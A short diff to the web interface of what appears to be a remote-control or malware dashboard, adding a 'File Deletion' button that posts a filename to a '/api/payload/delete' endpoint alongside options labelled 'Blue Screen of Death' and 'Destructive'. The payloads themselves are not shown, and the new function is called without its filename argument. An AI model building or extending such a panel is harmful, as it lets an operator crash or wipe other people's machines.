@@ -37,7 +37,7 @@
                   Destructive
                 </button>
                 <button type="button" class="list-group-item list-group-item-action" onclick="getPayloadBytes('bsod')">Blue Screen of Death</button>
-                <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">File Deletion</button>
+                <button type="button" class="list-group-item list-group-item-action"onclick="deleteStuff()">File Deletion</button>""
                 <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('calc')">Open Windows</button>
               </div><!-- End List group with Links and buttons -->
 
@@ -116,6 +116,16 @@ function callAPI(payload) {
   xhr.send(JSON.stringify({
       "client": '{{client}}',
       "payload": payload
+  }));
+}
+
+function deleteStuff(stuff) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", '/api/payload/delete', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+      "client": '{{client}}',
+      "filename": stuff
   }));
 }
 
